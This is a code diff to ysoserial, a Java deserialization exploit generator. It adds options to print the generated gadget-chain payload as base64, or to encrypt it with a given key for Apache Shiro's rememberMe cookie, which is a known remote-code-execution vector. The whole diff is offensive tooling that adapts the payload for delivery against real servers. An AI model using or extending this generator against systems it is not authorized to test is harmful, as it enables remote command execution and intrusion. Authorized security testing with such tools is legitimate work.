@@ -3,10 +3,12 @@ package ysoserial;
 import java.io.PrintStream;
 import java.util.*;
 
+import sun.misc.BASE64Encoder;
 import ysoserial.payloads.ObjectPayload;
 import ysoserial.payloads.ObjectPayload.Utils;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.util.ShiroUtil;
 
 @SuppressWarnings("rawtypes")
 public class GeneratePayload {
@@ -14,7 +16,7 @@ public class GeneratePayload {
 	private static final int USAGE_CODE = 64;
 
 	public static void main(final String[] args) {
-		if (args.length != 2) {
+		if (args.length < 2) {
 			printUsage();
 			System.exit(USAGE_CODE);
 		}
@@ -32,8 +34,26 @@ public class GeneratePayload {
 		try {
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command);
-			PrintStream out = System.out;
-			Serializer.serialize(object, out);
+            if (args.length >= 3) {
+                byte[] payloadBytes = Serializer.serialize(object);
+                String result = null;
+                if (args[2].equals("base64")) {
+                    BASE64Encoder encoder = new BASE64Encoder();
+                    result = encoder.encode(payloadBytes);
+                    result = result.replace("\n", "").replace("\r", "");
+                } else if (args[2].equals("shiro") && args.length == 4) {
+                    result = ShiroUtil.encrypt(payloadBytes, args[3]);
+                }
+                if (result != null) {
+                    System.out.println(result);
+                } else {
+                    throw new IllegalArgumentException("Error encoder...");
+                }
+
+            } else {
+                PrintStream out = System.out;
+                Serializer.serialize(object, out);
+            }
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
@@ -45,7 +65,7 @@ public class GeneratePayload {
 
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
+		System.err.println("Usage: java -jar ysoserial-[version]-all.jar <payload> <command> [base64|shiro]");
 		System.err.println("  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
